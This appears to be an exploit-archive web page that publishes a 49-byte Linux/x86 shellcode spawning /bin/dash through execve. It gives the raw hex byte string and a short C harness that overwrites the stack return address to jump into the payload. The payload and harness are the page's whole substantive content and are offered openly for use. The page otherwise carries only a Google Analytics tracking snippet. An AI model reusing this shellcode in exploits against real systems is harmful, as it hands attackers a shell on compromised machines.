<html><head><title>Linux/x86 - execve(/bin/dash) - 49 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
*  Shellcode length: 49 
*  Author: Chroniccommand 
*  /bin/dash
*  My first attempt at shellcode
*  Poison security
*/
#include&lt;stdio.h&gt;
//49 bytes 
char shellcode[] =  &quot;\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a&quot;
                    &quot;\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d&quot;
                    &quot;\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f&quot;
                    &quot;\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42&quot;
                    &quot;\x42\x42\x43\x43\x43\x43&quot;;
int main(){
 printf(&quot;Shellcode length: 49 bytes\nAuthor:chroniccommand\nPoison security&quot;);
 int *ret;
 ret = (int *)&amp;ret + 2;
 (*ret) = (int)shellcode;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
